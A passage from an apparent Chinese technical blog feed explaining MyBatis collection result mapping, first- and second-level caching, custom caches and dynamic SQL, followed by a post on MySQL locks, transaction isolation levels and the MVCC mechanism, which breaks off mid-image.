<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Post&quot;</span> <span class="attr">select</span>=<span class="string">&quot;selectPostsForBlog&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="集合的嵌套结果映射"><a href="#集合的嵌套结果映射" class="headerlink" title="集合的嵌套结果映射"></a>集合的嵌套结果映射</h4><p>现在你可能已经猜到了集合的嵌套结果映射是怎样工作的——除了新增的 “ofType” 属性，它和关联的完全相同。</p>
<p>首先, 让我们看看对应的 SQL 语句：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectBlog&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogResult&quot;</span>&gt;</span></span><br><span class="line">  select</span><br><span class="line">  B.id as blog_id,</span><br><span class="line">  B.title as blog_title,</span><br><span class="line">  B.author_id as blog_author_id,</span><br><span class="line">  P.id as post_id,</span><br><span class="line">  P.subject as post_subject,</span><br><span class="line">  P.body as post_body,</span><br><span class="line">  from Blog B</span><br><span class="line">  left outer join Post P on B.id = P.blog_id</span><br><span class="line">  where B.id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们再次连接了博客表和文章表，并且为每一列都赋予了一个有意义的别名，以便映射保持简单。 要映射博客里面的文章集合，就这么简单：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_id&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;title&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_title&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_id&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;subject&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_subject&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;body&quot;</span> <span class="attr">column</span>=<span class="string">&quot;post_body&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再提醒一次，要记得上面 id 元素的重要性，如果你不记得了，请阅读关联部分的相关部分。</p>
<p>如果你喜欢更详略的、可重用的结果映射，你可以使用下面的等价形式：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Blog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_id&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;title&quot;</span> <span class="attr">column</span>=<span class="string">&quot;blog_title&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">&quot;posts&quot;</span> <span class="attr">ofType</span>=<span class="string">&quot;Post&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;blogPostResult&quot;</span> <span class="attr">columnPrefix</span>=<span class="string">&quot;post_&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;blogPostResult&quot;</span> <span class="attr">type</span>=<span class="string">&quot;Post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;subject&quot;</span> <span class="attr">column</span>=<span class="string">&quot;subject&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">&quot;body&quot;</span> <span class="attr">column</span>=<span class="string">&quot;body&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><p>MyBatis 内置了一个强大的事务性查询缓存机制，它可以非常方便地配置和定制。 </p>
<p>为了使它更加强大而且易于配置，我们对 MyBatis 3 中的缓存实现进行了许多改进。</p>
<p>默认情况下，只启用了本地的会话缓存，它仅仅对一个会话中的数据进行缓存。 </p>
<h2 id="一级缓存"><a href="#一级缓存" class="headerlink" title="一级缓存"></a>一级缓存</h2><p>一级缓存也叫本地缓存：</p>
<ul>
<li>与数据库同一次会话期间查询到的数据会放在本地缓存中。</li>
<li>以后如果需要获取相同的数据，直接从缓存中拿，没必须再去查询数据库；</li>
<li>默认是一级缓存</li>
</ul>
<h2 id="二级缓存"><a href="#二级缓存" class="headerlink" title="二级缓存"></a>二级缓存</h2><p>要启用全局的二级缓存，只需要在你的 SQL 映射文件中添加一行：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>基本上就是这样。这个简单语句的效果如下:</p>
<ul>
<li>映射语句文件中的所有 select 语句的结果将会被缓存。</li>
<li>映射语句文件中的所有 insert、update 和 delete 语句会刷新缓存。</li>
<li>缓存会使用最近最少使用算法（LRU, Least Recently Used）算法来清除不需要的缓存。</li>
<li>缓存不会定时进行刷新（也就是说，没有刷新间隔）。</li>
<li>缓存会保存列表或对象（无论查询方法返回哪种）的 1024 个引用。</li>
<li>缓存会被视为读&#x2F;写缓存，这意味着获取到的对象并不是共享的，可以安全地被调用者修改，而不干扰其他调用者或线程所做的潜在修改。</li>
</ul>
</li>
<li><p>二级缓存也叫全局缓存，一级缓存作用域太低了，所以诞生了二级缓存</p>
</li>
<li><p>基于namespace级别的缓存，一个名称空间，对应一个二级缓存；</p>
</li>
<li><p>工作机制</p>
</li>
<li><ul>
<li>一个会话查询一条数据，这个数据就会被放在当前会话的一级缓存中；</li>
<li>如果当前会话关闭了，这个会话对应的一级缓存就没了；但是我们想要的是，会话关闭了，一级缓存中的数据被保存到二级缓存中；</li>
<li>新的会话查询信息，就可以从二级缓存中获取内容；</li>
<li>不同的mapper查出的数据会放在自己对应的缓存（map）中；</li>
</ul>
</li>
</ul>
<p><strong>提示</strong> 缓存只作用于 <strong>cache 标签所在的映射文件中的语句</strong>。</p>
<p>如果你混合使用 Java API 和 XML 映射文件，在共用接口中的语句将不会被默认缓存。你需要使用 @CacheNamespaceRef 注解指定缓存作用域。</p>
<p>这些属性可以通过 cache 元素的属性来修改。比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span></span></span><br><span class="line"><span class="tag">  <span class="attr">eviction</span>=<span class="string">&quot;FIFO&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">flushInterval</span>=<span class="string">&quot;60000&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">size</span>=<span class="string">&quot;512&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">readOnly</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个更高级的配置创建了一个 FIFO 缓存，每隔 60 秒刷新，最多可以存储结果对象或列表的 512 个引用，而且返回的对象被认为是只读的，因此对它们进行修改可能会在不同线程中的调用者产生冲突。</p>
<p>可用的清除策略有：</p>
<ul>
<li><code>LRU</code> – 最近最少使用：移除最长时间不被使用的对象。</li>
<li><code>FIFO</code> – 先进先出：按对象进入缓存的顺序来移除它们。</li>
<li><code>SOFT</code> – 软引用：基于垃圾回收器状态和软引用规则移除对象。</li>
<li><code>WEAK</code> – 弱引用：更积极地基于垃圾收集器状态和弱引用规则移除对象。</li>
</ul>
<p>默认的清除策略是 LRU。</p>
<p>flushInterval（刷新间隔）属性可以被设置为任意的正整数，设置的值应该是一个以毫秒为单位的合理时间量。 默认情况是不设置，也就是没有刷新间隔，缓存仅仅会在调用语句时刷新。</p>
<p>size（引用数目）属性可以被设置为任意正整数，要注意欲缓存对象的大小和运行环境中可用的内存资源。默认值是 1024。</p>
<p>readOnly（只读）属性可以被设置为 true 或 false。只读的缓存会给所有调用者返回缓存对象的相同实例。 因此这些对象不能被修改。这就提供了可观的性能提升。而可读写的缓存会（通过序列化）返回缓存对象的拷贝。 速度上会慢一些，但是更安全，因此默认值是 false。</p>
<p><strong>提示</strong> 二级缓存是事务性的。这意味着，当 SqlSession 完成并提交时，或是完成并回滚，但没有执行 flushCache&#x3D;true 的 insert&#x2F;delete&#x2F;update 语句时，缓存会获得更新。</p>
<h2 id="缓存原理"><a href="#缓存原理" class="headerlink" title="缓存原理"></a>缓存原理</h2><ul>
<li>只要开启了二级缓存，我们在同一个Mapper中的查询，可以在二级缓存中拿到数据</li>
<li>查出的数据都会被默认先放在一级缓存中</li>
<li>只有会话提交或者关闭以后，一级缓存中的数据才会转到二级缓存中</li>
</ul>
<p>一级缓存与二级缓存的执行顺序为：</p>
<p>先查二级缓存，再查一级缓存，再查数据库；即使在一个sqlSession中，也会先查二级缓存；一个namespace中的查询更是如此。</p>
<h2 id="使用自定义缓存"><a href="#使用自定义缓存" class="headerlink" title="使用自定义缓存"></a>使用自定义缓存</h2><p>除了上述自定义缓存的方式，你也可以通过实现你自己的缓存，或为其他第三方缓存方案创建适配器，来完全覆盖缓存行为。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span> <span class="attr">type</span>=<span class="string">&quot;com.domain.something.MyCustomCache&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个示例展示了如何使用一个自定义的缓存实现。type 属性指定的类必须实现 org.apache.ibatis.cache.Cache 接口，且提供一个接受 String 参数作为 id 的构造器。 这个接口是 MyBatis 框架中许多复杂的接口之一，但是行为却非常简单。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Cache</span> &#123;</span><br><span class="line">  String <span class="title function_">getId</span><span class="params">()</span>;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">getSize</span><span class="params">()</span>;</span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">putObject</span><span class="params">(Object key, Object value)</span>;</span><br><span class="line">  Object <span class="title function_">getObject</span><span class="params">(Object key)</span>;</span><br><span class="line">  <span class="type">boolean</span> <span class="title function_">hasKey</span><span class="params">(Object key)</span>;</span><br><span class="line">  Object <span class="title function_">removeObject</span><span class="params">(Object key)</span>;</span><br><span class="line">  <span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了对你的缓存进行配置，只需要简单地在你的缓存实现中添加公有的 JavaBean 属性，然后通过 cache 元素传递属性值，例如，下面的例子将在你的缓存实现上调用一个名为 <code>setCacheFile(String file)</code> 的方法：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">cache</span> <span class="attr">type</span>=<span class="string">&quot;com.domain.something.MyCustomCache&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cacheFile&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/tmp/my-custom-cache.tmp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cache</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>你可以使用所有简单类型作为 JavaBean 属性的类型，MyBatis 会进行转换。 你也可以使用占位符（如 <code>$&#123;cache.file&#125;</code>），以便替换成在<a class="link"   href="https://mybatis.org/mybatis-3/zh/configuration.html#properties" >配置文件属性<i class="fas fa-external-link-alt"></i></a>中定义的值。</p>
<p>从版本 3.4.2 开始，MyBatis 已经支持在所有属性设置完毕之后，调用一个初始化方法。 如果想要使用这个特性，请在你的自定义缓存类里实现 <code>org.apache.ibatis.builder.InitializingObject</code> 接口。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">public interface InitializingObject &#123;</span><br><span class="line">  void initialize() throws Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>提示</strong> 上一节中对缓存的配置（如清除策略、可读或可读写等），不能应用于自定义缓存。</p>
<p>请注意，缓存的配置和缓存实例会被绑定到 SQL 映射文件的命名空间中。 因此，同一命名空间中的所有语句和缓存将通过命名空间绑定在一起。 每条语句可以自定义与缓存交互的方式，或将它们完全排除于缓存之外，这可以通过在每条语句上使用两个简单属性来达成。 默认情况下，语句会这样来配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">...</span> <span class="attr">flushCache</span>=<span class="string">&quot;false&quot;</span> <span class="attr">useCache</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">...</span> <span class="attr">flushCache</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">...</span> <span class="attr">flushCache</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">...</span> <span class="attr">flushCache</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>鉴于这是默认行为，显然你永远不应该以这样的方式显式配置一条语句。但如果你想改变默认的行为，只需要设置 flushCache 和 useCache 属性。比如，某些情况下你可能希望特定 select 语句的结果排除于缓存之外，或希望一条 select 语句清空缓存。类似地，你可能希望某些 update 语句执行时不要刷新缓存。</p>
<h1 id="动态SQL"><a href="#动态SQL" class="headerlink" title="动态SQL"></a>动态SQL</h1><p>动态 SQL 是 MyBatis 的强大特性之一。如果你使用过 JDBC 或其它类似的框架，你应该能理解根据不同条件拼接 SQL 语句有多痛苦，例如拼接时要确保不能忘记添加必要的空格，还要注意去掉列表最后一个列名的逗号。利用动态 SQL，可以彻底摆脱这种痛苦。</p>
<p>使用动态 SQL 并非一件易事，但借助可用于任何 SQL 映射语句中的强大的动态 SQL 语言，MyBatis 显著地提升了这一特性的易用性。</p>
<p>如果你之前用过 JSTL 或任何基于类 XML 语言的文本处理器，你对动态 SQL 元素可能会感觉似曾相识。在 MyBatis 之前的版本中，需要花时间了解大量的元素。借助功能强大的基于 OGNL 的表达式，MyBatis 3 替换了之前的大部分元素，大大精简了元素种类，现在要学习的元素种类比原来的一半还要少。</p>
<ul>
<li>if</li>
<li>choose (when, otherwise)</li>
<li>trim (where, set)</li>
<li>foreach</li>
</ul>
<p>动态SQL的官方文档有很清晰的例子和解释</p>
<p><a class="link"   href="https://mybatis.org/mybatis-3/zh/dynamic-sql.html" >https://mybatis.org/mybatis-3/zh/dynamic-sql.html<i class="fas fa-external-link-alt"></i></a></p>
<hr>
<h1 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h1><p>总的来说 Mybatis的相关配置、xml和注解配置</p>
<p>相关使用 结果集映射方法  三个关键类</p>
<p>缓存机制、动态sql等</p>
<p>主要的重点在这几块方面，当以后遇到问题，可供继续学习查找。</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql事务及MVCC</title>
    <url>/2021/08/20/2021/Mysql%E4%BA%8B%E5%8A%A1%E5%8F%8AMVCC/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Mysql的锁"><a href="#Mysql的锁" class="headerlink" title="Mysql的锁"></a>Mysql的锁</h1><p>本文主要讲述Mysql事务机制、锁机制、MVCC机制等知识</p>
<h2 id="锁的定义"><a href="#锁的定义" class="headerlink" title="锁的定义"></a>锁的定义</h2><p>锁是计算机协调多个进程或线程并发访问某一资源的机制。在数据库中，除了传统的计算资源（如CPU、RAM、I&#x2F;O等）的争用以外，数据也是一种供需要用户共享的资源。</p>
<p>如何保证数据并发访问的一致性、有效性是所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个重要因素。</p>
<h2 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h2><p>Mysql中的锁按照不同方面分类，可以有以下三种分类：</p>
<ol>
<li>从性能上分为<strong>乐观锁</strong>和<strong>悲观锁</strong></li>
</ol>
<p>悲观锁，正如其名，具有强烈的独占和排他特性。它指的是对数据被外界(包括本系统当前的其他事务，以及来自外部系统的事务处理)修改持保守态度。因此，在整个数据处理过程中，将数据处于锁定状态。</p>
<p>悲观锁的实现，往往依靠数据库本身提供的锁机制实现。简单来说，就是只要我正在使用数据，别人都无法获取这条数据。</p>
<p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所有人都可以获取同一条数据，让用户决定如何去做。乐观锁可以通过<strong>版本号</strong>的方式实现，也就是在数据库表中添加一个版本号字段，用户拿到数据后和自己的版本号进行对比，如果不一致就跳过，一致则进行处理。相比于悲观锁而言，乐观锁的吞吐量更高。</p>
<ol>
<li>从对数据库操作的类型分，分为<strong>读锁</strong>和<strong>写锁</strong></li>
</ol>
<p>读锁和写锁都属于悲观锁，它们两的区别如下：</p>
<ul>
<li>读锁（共享锁）：针对同一份数据，多个读操作可以同时进行而不会互相影响，但是不能进行写操作。</li>
<li>写锁（排它锁）：针对同一份数据，当前写操作没有完成前，其他写操作和读操作都会被阻断。</li>
</ul>
<ol>
<li>从对数据操作的粒度分，分为<strong>表锁</strong>和<strong>行锁</strong></li>
</ol>
<ul>
<li>表锁<br>每次操作锁住整张表。它的特点是：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发性能差。</li>
<li>行锁<br>每次操作锁住一行数据。它的特点是：开销大，加锁慢；会出现死锁；锁定粒度小，发生锁冲突的概率最低，并发性能高。</li>
</ul>
<p>对于不同的引擎而言，<strong>MyISAM</strong>引擎的表只有表锁，不支持事务；</p>
<p>而<strong>InnoDB</strong>的表既有表锁也有行锁，并且支持事务。</p>
<h1 id="Mysql事务隔离级别"><a href="#Mysql事务隔离级别" class="headerlink" title="Mysql事务隔离级别"></a>Mysql事务隔离级别</h1><p>Mysql中设置了4种隔离级别来针对不同的问题，我们先来看看并发事务中可能存在的问题：</p>
<h2 id="并发事务处理带来的问题"><a href="#并发事务处理带来的问题" class="headerlink" title="并发事务处理带来的问题"></a>并发事务处理带来的问题</h2><ul>
<li>更新丢失（Lost Update）</li>
</ul>
<p>当两个或多个事务选择同一行，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题，即最后的更新覆盖了由其他事务所做的更新。 这个问题可以通过乐观锁或者行锁解决。</p>
<ul>
<li>脏读（Dirty Reads）</li>
</ul>
<p>一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致的状态；这时另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”数据，并据此作进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象的叫做“脏读”。</p>
<p>一句话：事务A读取到了事务B已经修改但尚未提交的数据，还在这个数据基础上做了操作。此时，如果B事务回滚，A读取的数据无效，不符合事务一致性的要求。</p>
<ul>
<li>不可重读读（Non-Repeatable Reads）</li>
</ul>
<p>一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现其读出的数据已经发生了改变、或某些记录已经被删除了！这种现象就叫做“不可重复读”。</p>
<p>一句话：事务A读取到了事务B已经提交的修改数据，不符合隔离性。</p>
<ul>
<li>幻读（Phantom Reads）</li>
</ul>
<p>一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。</p>
<p>一句话：事务A读取到了事务B提交的新增数据，不符合隔离性。</p>
<h2 id="四种事务隔离级别"><a href="#四种事务隔离级别" class="headerlink" title="四种事务隔离级别"></a>四种事务隔离级别</h2><p>脏读、不可重复读和幻读其实都是数据库读一致性问题，必须由数据库提供一定的事务隔离机制来解决。 如下表所示：</p>
<table>
<thead>
<tr>
<th>隔离级别</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>读未提交(Read uncommitted)</td>
<td>可能</td>
<td>可能</td>
<td>可能</td>
</tr>
<tr>
<td>读已提交(Read committed)</td>
<td>不可能</td>
<td>可能</td>
<td>可能</td>
</tr>
<tr>
<td>可重复读(Repeatable read)</td>
<td>不可能</td>
<td>不可能</td>
<td>可能</td>
</tr>
<tr>
<td>串行化(Serializable)</td>
<td>不可能</td>
<td>不可能</td>
<td>不可能</td>
</tr>
</tbody></table>
<p>数据库的事务隔离越严格，并发副作用越小，但付出的代价也就越大。</p>
<p>同时，不同的应用对读一致性和事务隔离程度的要求也是不同的，比如许多应用对不可重复读和幻读并不敏感，而更关心数据并发访问的能力。</p>
<p>Mysql.7版本通过<code>show variables like &#39;tx_isolation&#39;;</code>查看当前数据库的事务隔离级别</p>
<p>而Mysql8则时通过<code>show variables like &#39;transaction_isolation&#39;;</code>查看。</p>
<p>Mysql默认的事务隔离级别为可重复读。</p>
<p>Mysql5.7版本可通过<code>set tx_isolation=&#39;REPEATABLE-READ&#39;</code>设置，Mysql8版本可通过<code>set transaction_isolation=&#39;REPEATABLE-READ&#39;</code>设置。</p>
<hr>
<p>可串行化隔离级别使用的是表锁。虽然串行化能解决幻读，但是这种隔离级别并发性极低，开发中很少会用到。</p>
<p>那么在Mysql默认的可重复读级别下，有办法解决幻读吗？</p>
<blockquote>
<p>间隙锁在某些情况下可以解决幻读问题</p>
<p>间隙锁就是给一个范围内的数据上锁。比如在一张表中，id从11到19的范围中没有数据，那么在事务一中执行<code>update user  set name = &#39;liduoan&#39; where id &gt; 10 and id &lt;=20</code>，则其他事务就没法在这个范围所包含的间隙里插入或修改任何数据。（间隙锁在可重复读级别下才会生效。）</p>
<p>注意 这里的select还是基于MVCC处理的。</p>
</blockquote>
<h1 id="Mysql的MVCC机制详解"><a href="#Mysql的MVCC机制详解" class="headerlink" title="Mysql的MVCC机制详解"></a>Mysql的MVCC机制详解</h1><p>介绍完了事务隔离级别，下面我们来介绍以下Mysql中重要的MVCC机制，个人认为，这个还是需要多看去理解清楚的：</p>
<h2 id="MVCC简介"><a href="#MVCC简介" class="headerlink" title="MVCC简介"></a>MVCC简介</h2><p>MVCC全称<code>Multi-Version Concurrency Control</code>，即多版本并发控制。</p>
<p>MVCC是一种并发控制的方法，一般在数据库管理系统中，实现对数据库的并发访问，在编程语言中实现事务内存。</p>
<p>我们知道，Mysql中的读和写是存在线程安全问题的，我们前面也介绍了脏读、幻读、不可重复读这些问题。</p>
<p>如果只能通过普通地加锁来解决，那么这势必会影响效率，而MVCC就是一种针对<strong>读写冲突的无锁并发控制</strong>问题的解决方案。</p>
<p><strong>简单来说就是在不加锁的情况下，读（快照读）和写可以同时进行，而且互不影响</strong>。</p>
<blockquote>
<p>理解快照读和当前读：</p>
<ul>
<li>当前读<br>像<code>select lock in share mode</code>，<code>select for update</code>， <code>update</code>，<code>insert</code>，<code>delete</code>这些操作都是一种当前读，为什么叫当前读？因为它<strong>读取的是记录的最新版本</strong>，读取时还要保证其他并发事务不能修改当前记录，会对读取的记录进行加锁。</li>
<li>快照读<br>像不加锁的select操作就是快照读，即不加锁的非阻塞读。快照读的前提是隔离级别不是串行化级别，串行化级别下的快照读会退化成当前读。之所以出现快照读的情况，是基于提高并发性能的考虑，快照读的实现是就是基于多版本并发控制，即MVCC。可以认为MVCC是行锁的一个变种，但它在很多情况下，避免了加锁操作，降低了开销；既然是基于多版本，即<strong>快照读可能读到的并不一定是数据的最新版本，而有可能是之前的历史版本</strong>。</li>
</ul>
</blockquote>
<p>Mysql中实现了MVCC这一理想概念，快照读就是其中一个具体非阻塞读功能。就像我们在<strong>可重复读</strong>事务隔离级别中所演示那样，无论其他事务如何修改数据，在本事务中读出的数据都是相同的。那到底是如何实现的？</p>
<h2 id="MVCC实现原理"><a href="#MVCC实现原理" class="headerlink" title="MVCC实现原理"></a>MVCC实现原理</h2><p>在MVCC的实现原理之前，先了解几个重要的概念：</p>
<h3 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h3><p>1、隐藏字段</p>
<p>数据库表中每行记录除了我们自定义的字段外，还有数据库隐含的字段：</p>
<ul>
<li>DB_TRX_ID：最近修改(<code>修改/插入</code>)事务ID，用来记录最后一次修改该记录的事务ID。Mysql会给每个事务分配一个id，这个id是不断增长的，每次加1，所以<strong>事务越新id越大</strong>。</li>
<li>DB_ROLL_PTR：回滚指针，指向这条记录的上一个版本。</li>
<li>DB_ROW_ID：隐含的自增ID，即隐藏主键。如果数据表没有创建主键，InnoDB会自动以该列产生一个聚簇索引。</li>
<li>flag字段：删除标记字段，记录被更新或删除并不代表真的删除，而是该标记字段变了。</li>
</ul>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/08/16/NgBZPKR3FDrJ1yf.png"
                      alt="image.png"
                ></p>
<p><strong>由于我们设置了自增的主键，因此DB_ROW_ID字段就不会出现。</strong></p>
<p>最重要的就是<strong>DB_TRX_ID</strong>和<strong>DB_ROLL_PTR</strong>这两个字段。</p>
<p>这两个字段是事务ID和回滚指针，那么我们就需要去了解对应的undo日志了。</p>
<p>2、undo日志</p>
<p>undo log主要分为以下两种：</p>
<ul>
<li>insert undo log<br>代表事务在<code>insert</code>新记录时产生的<code>undo log</code>，只在事务回滚时需要，并且在事务提交后可以被立即丢弃。</li>
<li>update undo log<br>事务在进行<code>update</code>或<code>delete</code>时产生的<code>undo log</code>， 不仅在事务回滚时需要，在快照读时也需要，所以不能随便删除。只有在快速读或事务回滚不涉及该日志时，对应的日志才会被<code>purge</code>线程统一清除。</li>
</ul>
<blockquote>
<p>什么是purge线程？</p>
<p>从前面的分析可以看出，为了实现InnoDB的MVCC机制，更新或者删除操作都只是设置一下老记录的<strong>删除标记</strong>，并不真正将过时的记录删除。但是为了节省磁盘空间，InnoDB引擎有专门的purge线程来清理删除标记为true的记录，purge线程在安全的情况下，会清理删除标记为true的记录。</p>
</blockquote>
<p>对MVCC有帮助的实质是<code>update undo log</code>，可以将它理解为一条<strong>旧记录链</strong>。我们通过如下流程举例：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2020/10/27/Nb9M4DFPAWCnRUS.jpg"
                      alt="lock16.jpg"
                ></p>
<p>从图中的过程就可以看出，不同事务或者相同事务的对同一记录的修改，会导致该记录的<code>undo log</code>成为一条记录链表，<code>undo log</code>的链首就是最新的旧记录，链尾就是最早的旧记录。除了最新数据，<code>undo log</code>中所有行的删除标签都为<code>true</code>。</p>
<blockquote>
<p>注意：只要一个事务开启，对数据进行了<strong>修改</strong>，数据记录链中都插入该事务id修改的记录，无论有没有提交。只是根据事务执行的结果会进行不同的操作，如果事务<code>commit</code>就会保留该记录，如果事务<code>rollback</code>就会删除该记录。</p>
</blockquote>
<p>3、Read View(读视图)</p>
<p>Read View是非常重要的一个概念，一个事务进行<strong>快照读</strong>操作时，会生产一个<strong>读视图</strong>，即ReadView。在该事务执行的快照读的那一刻，会生成数据库系统当前的一个快照，记录并维护系统当前活跃事务的ID。</p>
<p><code>Read View</code>主要是用来做<strong>可见性判断</strong>的，它作为用来判断当前事务能够看到记录链中哪个版本的数据的条件。接下来我们着重介绍这一可见性判断的流程是如何实现的。</p>
<h3 id="主要流程"><a href="#主要流程" class="headerlink" title="主要流程"></a>主要流程</h3><p><code>Read View</code>遵循一个可见性算法：</p>
<p>对某行(几行)数据进行<strong>快照读</strong>时 (产生了<strong>Read View</strong>) ，会从这一行(几行)在记录链中的最新数据中，取出隐藏字段<code>DB_TRX_ID</code>的ID值，与<code>Read View</code>中维护的值进行某些比较，如果不符合可见性，那就通过<code>DB_ROLL_PTR</code>回滚指针去取出记录链中下一条数据的<code>DB_TRX_ID</code>继续比较。</p>
<p><strong>即从头到尾遍历记录链的<code>DB_TRX_ID</code>与当前Read View中的值进行比较，直到找到满足特定条件的<code>DB_TRX_ID</code>，那么对应的这条数据就是当前事务可见的最新旧记录</strong>。</p>
<p>那<code>Read View</code>中究竟是什么？可以用下图简易理解</p>
<p><img  
